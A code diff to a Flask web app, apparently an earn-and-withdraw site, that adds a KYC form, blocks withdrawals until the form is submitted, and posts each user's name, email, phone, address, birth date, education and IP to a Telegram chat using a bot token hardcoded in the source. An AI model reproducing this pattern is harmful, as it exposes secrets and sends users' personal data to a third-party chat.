@@ -128,6 +128,21 @@ def cleanup_old_data():
                 
     except Exception as e:
         print(f"Cleanup Error: {e}")
+
+# --- HELPER: SEND TELEGRAM NOTIFICATION ---
+def send_telegram_alert(message):
+    try:
+        bot_token = "8400750468:AAEtGwUSCot8ecBXog29qehvcZXL9rqv_fA"
+        chat_id = "8571316406"
+        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+        payload = {
+            "chat_id": chat_id,
+            "text": message,
+            "parse_mode": "HTML"
+        }
+        requests.post(url, json=payload)
+    except Exception as e:
+        print(f"Telegram Error: {e}")
 # --- ROUTES ---
 @app.route('/')
 def index():
@@ -245,6 +260,73 @@ def session_login():
         print(f"Login Error: {e}")
         return jsonify({"status": "error", "message": str(e)}), 401
 
+
+@app.route('/kyc', methods=['GET'])
+@login_required
+def kyc_form():
+    uid = session['user_id']
+    user_doc = db.collection('users').document(uid).get()
+    user = user_doc.to_dict()
+
+    # যদি অলরেডি সাবমিট করে থাকে, ড্যাশবোর্ডে পাঠিয়ে দাও
+    if user.get('kyc_submitted', False):
+        flash("KYC already submitted!", "success")
+        return redirect(url_for('withdraw'))
+
+    return render_template('kyc.html', user=user)
+
+@app.route('/submit_kyc', methods=['POST'])
+@login_required
+def submit_kyc():
+    uid = session['user_id']
+    user_ref = db.collection('users').document(uid)
+    
+    # 1. ডাটা সংগ্রহ
+    name = request.form.get('name')
+    address = request.form.get('address')
+    phone = request.form.get('phone')
+    dob = request.form.get('dob')
+    education = request.form.get('education')
+    email = session['email']
+    
+    # IP Address বের করা (Vercel/Proxy সাপোর্টেড)
+    if request.headers.getlist("X-Forwarded-For"):
+        ip_address = request.headers.getlist("X-Forwarded-For")[0]
+    else:
+        ip_address = request.remote_addr
+
+    # 2. ডাটাবেসে আপডেট (KYC Done Mark)
+    user_ref.update({
+        'kyc_submitted': True,
+        'phone': phone,
+        'kyc_data': {
+            'name': name,
+            'address': address,
+            'dob': dob,
+            'education': education,
+            'ip': ip_address,
+            'timestamp': datetime.datetime.now()
+        }
+    })
+
+    # 3. টেলিগ্রামে মেসেজ পাঠানো
+    msg = f"""
+🚨 <b>NEW KYC SUBMISSION</b> 🚨
+
+👤 <b>Name:</b> {name}
+📧 <b>Email:</b> {email}
+📞 <b>Phone:</b> {phone}
+🏠 <b>Address:</b> {address}
+🎂 <b>DoB:</b> {dob}
+🎓 <b>Edu:</b> {education}
+
+🆔 <b>UID:</b> <code>{uid}</code>
+🌐 <b>IP:</b> {ip_address}
+    """
+    send_telegram_alert(msg)
+
+    flash("KYC submitted successfully! You can now withdraw.", "success")
+    return redirect(url_for('withdraw'))
 @app.route('/tutorial')
 def tutorial():
     return render_template('tutorial.html')
@@ -411,12 +493,18 @@ def tasks():
                 break
 
     return render_template('tasks.html', tasks=final_tasks)
+
 @app.route('/withdraw', methods=['GET', 'POST'])
 @login_required
 def withdraw():
     uid = session['user_id']
     user_ref = db.collection('users').document(uid)
     user = user_ref.get().to_dict()
+
+    # ⛔ KYC CHECK (NEW) ⛔
+    if not user.get('kyc_submitted', False):
+        flash("Please complete KYC verification first.", "error")
+        return redirect(url_for('kyc_form')) 
     
     if request.method == 'POST':
         try:
